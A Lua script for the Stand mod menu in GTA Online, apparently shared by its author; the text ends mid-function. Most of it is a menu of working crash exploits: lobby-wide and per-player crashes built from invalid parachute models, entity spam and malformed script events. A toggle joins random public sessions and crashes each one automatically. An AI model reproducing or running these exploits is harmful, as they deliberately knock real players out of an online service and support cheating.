-- Made by TheGecFantSheep#9026

local status, auto_updater = pcall(require, "auto-updater")
if not status then
    local auto_update_complete = nil util.toast("Installing auto-updater...", TOAST_ALL)
    async_http.init("raw.githubusercontent.com", "/hexarobi/stand-lua-auto-updater/main/auto-updater.lua",
        function(result, headers, status_code)
            local function parse_auto_update_result(result, headers, status_code)
                local error_prefix = "Error downloading auto-updater: "
                if status_code ~= 200 then util.toast(error_prefix..status_code, TOAST_ALL) return false end
                if not result or result == "" then util.toast(error_prefix.."Found empty file.", TOAST_ALL) return false end
                filesystem.mkdir(filesystem.scripts_dir() .. "lib")
                local file = io.open(filesystem.scripts_dir() .. "lib\\auto-updater.lua", "wb")
                if file == nil then util.toast(error_prefix.."Could not open file for writing.", TOAST_ALL) return false end
                file:write(result) file:close() util.toast("Successfully installed auto-updater lib", TOAST_ALL) return true
            end
            auto_update_complete = parse_auto_update_result(result, headers, status_code)
        end, function() util.toast("Error downloading auto-updater lib. Update failed to download.", TOAST_ALL) end)
    async_http.dispatch() local i = 1 while (auto_update_complete == nil and i < 40) do util.yield(250) i = i + 1 end
    if auto_update_complete == nil then error("Error downloading auto-updater lib. HTTP Request timeout") end
    auto_updater = require("auto-updater")
end
if auto_updater == true then error("Invalid auto-updater lib. Please delete your Stand/Lua Scripts/lib/auto-updater.lua and try again") end

SCRIPT_RUN_NAME = "OP_Sheep_script.lua"

auto_updater.run_auto_update({
    source_url="https://raw.githubusercontent.com/TheGecFantSheep/OP-Sheep-script/main/OP_Sheep_script.lua",
    script_relpath=SCRIPT_RELPATH,
    script_run_name=SCRIPT_RUN_NAME,
    verify_file_begins_with="--"
})

util.keep_running()
util.require_natives("1640181023")


protections = menu.list(menu.my_root(), "Protections", {}, "", function() end)
do_the_funny = menu.list(menu.my_root(), "Do the funny", {}, "", function() end)
cleanse = menu.list(menu.my_root(), "Cleanse", {}, "", function() end)

menu.toggle_loop(protections, "Automatically remove bounty", {}, "This will remove bountys placed on you automatically", function()
    if util.is_session_started() then
        if players.get_bounty(players.user()) then
            menu.trigger_commands("removebounty")
        end
    end
end)

menu.toggle_loop(do_the_funny, "Do the funny", {}, "This will join random sessions then crash it", function()
    started = util.is_session_started()
    if started == true then
        menu.trigger_commands("gopublic")
        menu.trigger_commands("invalidruiner")
        util.yield(100)
        menu.trigger_commands("invalidruiner2")
        util.yield(100)
        menu.trigger_commands("invalidumbrella")
        util.yield(100)
        menu.trigger_commands("invalidumbrella2")
        util.yield(100)
        menu.trigger_commands("invalidumbrella3")
        util.yield(100)
        menu.trigger_commands("invalidumbrella4")
        util.yield(100)
        menu.trigger_commands("ngc")
        util.yield(100)
        menu.trigger_commands("invalidbob")
        util.yield(100)
        menu.trigger_commands("beepboop")
    end
end)


menu.action(cleanse, "Super cleanse", {"woosh"}, "Yeets enteties", function()
    local ct = 0
    for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
        entities.delete_by_handle(ent)

        ct = ct + 1
    end
    for k,ent in pairs(entities.get_all_peds_as_handles()) do
        if not PED.IS_PED_A_PLAYER(ent) then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)

        end
        ct = ct + 1
    end
    for k,ent in pairs(entities.get_all_objects_as_handles()) do
        if ent ~= PLAYER.PLAYER_PED_ID() then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)
            ct = ct + 1
        end	
    end
end)


function CreateVehicle(Hash, Pos, Heading, Invincible)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    if Invincible then
        ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
    end
    return SpawnedVehicle
end


function CreatePed(index, Hash, Pos, Heading)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_ped(index, Hash, Pos, Heading)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    return SpawnedVehicle
end


function CreateObject(Hash, Pos, static)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_object(Hash, Pos)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    if static then
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicle, true)
    end
    return SpawnedVehicle
end


lobby = menu.list(menu.my_root(), "Lobby Crash", {}, "", function() end)

menu.action(lobby, "Ruiner Crash V1", {"invalidruiner"}, "Doesn't cause any crash events but will crash the whole lobby", function()
    local spped = PLAYER.PLAYER_PED_ID()
    local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
    for i = 1, 15 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
        util.yield(200)
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 260873931)
        VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(200)
        entities.delete_by_handle(Ruiner2)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)

end)

menu.action(lobby, "Ruiner Crash V2", {"invalidruiner2"}, "Doesn't cause any crash events but will crash the whole lobby", function()
    local spped = PLAYER.PLAYER_PED_ID()
    local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
    for i = 1, 30 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 2200, false, true, true)
        util.yield(130)
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 3235319999)
        VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(130)
        entities.delete_by_handle(Ruiner2)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)

end)

menu.action(lobby, "Umbrella Crash V1", {"invalidumbrella"}, "Will trigger 'A0:336' will crash whole lobby", function()
    local SelfPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    for n = 0, 3 do
        local object_hash = util.joaat("prop_logpile_06b")
        STREAMING.REQUEST_MODEL(object_hash)
        while not STREAMING.HAS_MODEL_LOADED(object_hash) do
            util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0, 0, 500, false, true, true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z,
            false, true, true)

        local object_hash2 = util.joaat("prop_beach_parasol_03")
        STREAMING.REQUEST_MODEL(object_hash2)
        while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
            util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash2)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z,
            false, true, true)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z,
        false, true, true)
end)

menu.action(lobby, "Umbrella Crash V2", {"invalidumbrella2"}, "Doesn't cause any crash events but will crash the whole lobby", function()
    for n = 0, 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash = 1381105889
        STREAMING.REQUEST_MODEL(object_hash)
        while not STREAMING.HAS_MODEL_LOADED(object_hash) do
            util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        bush_hash = 720581693
        STREAMING.REQUEST_MODEL(bush_hash)
        while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
            util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
    end
end)
menu.action(lobby, "Umbrella Crash V3", {"invalidumbrella3"}, "Doesn't cause any crash events but will crash the whole lobby", function()
    for n = 0, 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash = 192829538
        STREAMING.REQUEST_MODEL(object_hash)
        while not STREAMING.HAS_MODEL_LOADED(object_hash) do
            util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        bush_hash = 192829538
        STREAMING.REQUEST_MODEL(bush_hash)
        while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
            util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
    end
end)

menu.action(lobby, "Umbrella Crash V4", {"invalidumbrella4"}, "Doesn't cause any crash events but will crash the whole lobby", function()
    for n = 0, 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash = 1117917059
        STREAMING.REQUEST_MODEL(object_hash)
        while not STREAMING.HAS_MODEL_LOADED(object_hash) do
            util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        bush_hash = 1117917059
        STREAMING.REQUEST_MODEL(bush_hash)
        while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
            util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
    end
end)

menu.action(lobby, "Nature Global Crash", {"ngc"}, "Will trigger 'A1:FBF7D21F' will crash whole lobby", function()
    local user = players.user()
    local user_ped = players.user_ped()
    local pos = players.get_position(user)
    util.yield(100)
    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
    util.yield()
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
    util.yield(250)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
    util.yield(1000)
    for i = 1, 5 do
        util.spoof_script("freemode", SYSTEM.WAIT)
    end
    ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
    NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
end)

menu.action(lobby, "Cargobob Crash", {"invalidbob"}, "Doesn't cause any crash events but will crash the whole lobby", function()
    local cspped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TPpos = ENTITY.GET_ENTITY_COORDS(cspped, true)
    local cargobob = CreateVehicle(0XFCFCB68B, TPpos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    local cargobobPos = ENTITY.GET_ENTITY_COORDS(cargobob, true)
    local veh = CreateVehicle(0X187D938D, TPpos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    local vehPos = ENTITY.GET_ENTITY_COORDS(veh, true)
    local newRope = PHYSICS.ADD_ROPE(TPpos.x, TPpos.y, TPpos.z, 0, 0, 10, 1, 1, 0, 1, 1, false, false, false, 1.0, false
        , 0)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, veh, cargobobPos.x, cargobobPos.y, cargobobPos.z, vehPos.x,
        vehPos.y, vehPos.z, 2, false, false, 0, 0, "Center", "Center")
    util.yield(2500)
    entities.delete_by_handle(cargobob)
    entities.delete_by_handle(veh)
    PHYSICS.DELETE_CHILD_ROPE(newRope)

    util.toast("Go Fuck Your Self")
end)

menu.action(lobby, "Sound Crash", {"beepboop"}, "Beep Boop Beep Boop Beep Boop Beep Boop will trigger 'X7'", function()
    local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local time = util.current_time_millis() + 2000
    while time > util.current_time_millis() do
        local TPPS = ENTITY.GET_ENTITY_COORDS(TPP, true)
        for i = 1, 20 do
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x, TPPS.y, TPPS.z, "GTAO_FM_Events_Soundset",
                true, 100000, false)
        end
        util.yield()
        for i = 1, 20 do
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x, TPPS.y, TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
        end
        util.yield()
    end
    util.toast("Sound Crash Completed")
end)


local function BlockSyncs(pid, callback)
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "on")
        end
    end
    util.yield(10)
    callback()
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "off")
        end
    end
end


local function request_model(hash, timeout)
    timeout = timeout or 3
    STREAMING.REQUEST_MODEL(hash)
    local end_time = os.time() + timeout
    repeat
        util.yield()
    until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
    return STREAMING.HAS_MODEL_LOADED(hash)
end


local function player(pid)
    menu.divider(menu.player_root(pid), "OP_Sheep_script")
    local Crash = menu.list(menu.player_root(pid), "Crash", {}, "")
    local friendly = menu.list(menu.player_root(pid), "Friendly", {}, "")
    local trolling = menu.list(menu.player_root(pid), "Trolling", {}, "")

    menu.action(Crash, "Host Crash", {"hostcrash"}, "Really unreliable won't backfire", function()
        local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        menu.trigger_commands("tpmazehelipad")
        ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)
        util.yield(1000)
        menu.trigger_commands("tpmazehelipad")
    end)

    local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
    pos.z = pos.z + 10
    veh = entities.get_all_vehicles_as_handles()

    menu.action(Crash, "5G Crash", {"5g"}, "Will trigger 'A2:521' won't backfire", function()
        local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
        pos.z = pos.z + 10
        veh = entities.get_all_vehicles_as_handles()

        for i = 1, #veh do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x, pos.y, pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
            TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 999)
            TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
        end
    end)

    menu.action(Crash, "YiYu Crash", {"yiyu"}, "Will trigger 'XF' won't backfire", function()
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local Object_jb1 = CreateObject(0xD75E01A6, TargetPlayerPos)
        local Object_jb2 = CreateObject(0x675D244E, TargetPlayerPos)
        local Object_jb3 = CreateObject(0x799B48CA, TargetPlayerPos)
        local Object_jb4 = CreateObject(0x68E49D4D, TargetPlayerPos)
        local Object_jb5 = CreateObject(0x66F34017, TargetPlayerPos)
        local Object_jb6 = CreateObject(0xDE1807BB, TargetPlayerPos)
        local Object_jb7 = CreateObject(0xC4C9551E, TargetPlayerPos)
        local Object_jb8 = CreateObject(0xCF37BA1F, TargetPlayerPos)
        local Object_jb9 = CreateObject(0xB69AD9F8, TargetPlayerPos)
        local Object_jb10 = CreateObject(0x5D750529, TargetPlayerPos)
        local Object_jb11 = CreateObject(0x1705D85C, TargetPlayerPos)
        for i = 0, 1000 do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false
                , true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false
                , true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false
                , true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false
                , true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb5, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false
                , true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb6, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false
                , true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb7, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false
                , true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb8, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false
                , true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb9, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false
                , true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb10, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
                false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb11, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
                false, true, true)
            util.yield(10)
        end
        util.yield(5500)
        entities.delete_by_handle(Object_jb1)
        entities.delete_by_handle(Object_jb2)
        entities.delete_by_handle(Object_jb3)
        entities.delete_by_handle(Object_jb4)
        entities.delete_by_handle(Object_jb5)
        entities.delete_by_handle(Object_jb6)
        entities.delete_by_handle(Object_jb7)
        entities.delete_by_handle(Object_jb8)
        entities.delete_by_handle(Object_jb9)
        entities.delete_by_handle(Object_jb10)
        entities.delete_by_handle(Object_jb11)
    end)

    menu.action(Crash, "Bro Hug", {"brohug"}, "Really unreliable won't backfire", function()
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), 0xE5022D03)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
        util.yield(20)
        local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), p_pos.x, p_pos.y, p_pos.z
            , false, true, true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 0xFBAB5776, 1000, false)
        TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), -1087, -3012, 13.94)
        util.yield(500)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
        util.yield(1000)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    end)

    menu.action(Crash, "Invalid vehicle tasks", {"Invalidvehicletasks"}, "Really unreliable won't backfire", function()
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 150 do
            util.trigger_script_event(1 << pid,
                { 2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max),
                    math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                    math.random(int_min, int_max),
                    math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max),
                    math.random(int_min, int_max) })
        end
        util.yield()
        for i = 1, 15 do
            util.trigger_script_event(1 << pid, { 1348481963, pid, math.random(int_min, int_max) })
        end
        menu.trigger_commands("givesh " .. players.get_name(pid))
        util.yield(100)
        util.trigger_script_event(1 << pid, { 495813132, pid, 0, 0, -12988, -99097, 0 })
        util.trigger_script_event(1 << pid, { 495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203 })
        util.trigger_script_event(1 << pid,
            { 495813132, pid, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8,
                827870001, 9, 17 })
    end)
    menu.action(Crash, "Invalid vehicle tasks2", {"Invalidvehicletasks2"}, "Will trigger 'XF' won't backfire", function()
        for i = 1, 10 do
            local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local cord = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            STREAMING.REQUEST_MODEL(-930879665)
            util.yield(10)
            STREAMING.REQUEST_MODEL(3613262246)
            util.yield(10)
            STREAMING.REQUEST_MODEL(452618762)
            util.yield(10)
            while not STREAMING.HAS_MODEL_LOADED(-930879665) do util.yield() end
            while not STREAMING.HAS_MODEL_LOADED(3613262246) do util.yield() end
            while not STREAMING.HAS_MODEL_LOADED(452618762) do util.yield() end
            local a1 = entities.create_object(-930879665, cord)
            util.yield(10)
            local a2 = entities.create_object(3613262246, cord)
            util.yield(10)
            local b1 = entities.create_object(452618762, cord)
            util.yield(10)
            local b2 = entities.create_object(3613262246, cord)
            util.yield(300)
            entities.delete_by_handle(a1)
            entities.delete_by_handle(a2)
            entities.delete_by_handle(b1)
            entities.delete_by_handle(b2)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(452618762)
            util.yield(10)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(3613262246)
            util.yield(10)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(-930879665)
            util.yield(10)
        end
        if SE_Notifications then
            notification("Finished.", colors.red)
        end
    end)
    menu.action(Crash, "Invalid vehicle tasks3", {"invalidvehicletasks3"}, "Will trigger 'A2:521' won't backfire", function()
        local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
        pos.z = pos.z + 10
        veh = entities.get_all_vehicles_as_handles()

        for i = 1, #veh do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x, pos.y, pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
            TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 999)
            TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
        end
    end)


    menu.action(Crash, "Medusa crash", {"medusa"}, "Really unreliable won't backfire", function()
    
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local plauuepos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        plauuepos.x = plauuepos.x + 5
        plauuepos.z = plauuepos.z + 5
        local hunter = {}
        for i = 1, 3 do
            for n = 0, 120 do
                hunter[n] = CreateVehicle(1077420264, plauuepos, 0)
                util.yield(0)
                ENTITY.FREEZE_ENTITY_POSITION(hunter[n], true)
                util.yield(0)
                VEHICLE.EXPLODE_VEHICLE(hunter[n], true, true)
            end
            util.yield(190)
            for i = 1, #hunter do
                if hunter[i] ~= nil then
                    entities.delete_by_handle(hunter[i])
                end
            end
        end
        util.toast("Crash done QWQ")
    
        hunter = nil
        plauuepos = nil
    end)

    menu.action(Crash, "NPC Crash", {"npccrash"}, "Will trigger stands spam protection", function()
    
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local SpawnPed_Wade = {}
        for i = 1, 40 do
            SpawnPed_Wade[i] = CreatePed(26, util.joaat("PLAYER_ONE"), TargetPlayerPos,
                ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
            util.yield(1)
        end
        util.yield(5000)
        for i = 1, 60 do
            entities.delete_by_handle(SpawnPed_Wade[i])
        
        end
    end)

    menu.action(Crash, "Invalid Appearance Crash", {"invalidappearance"}, "Will trigger 'XS' won't backfire", function()
    
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local SelfPlayerPed = PLAYER.PLAYER_PED_ID();
        local Spawned_Mike = CreatePed(26, util.joaat("player_zero"), TargetPlayerPos,
            ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        for i = 0, 500 do
            PED.SET_PED_COMPONENT_VARIATION(Spawned_Mike, 0, 0, math.random(0, 10), 0)
            ENTITY.SET_ENTITY_COORDS(Spawned_Mike, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false,
                false, true);
            util.yield(10)
        end
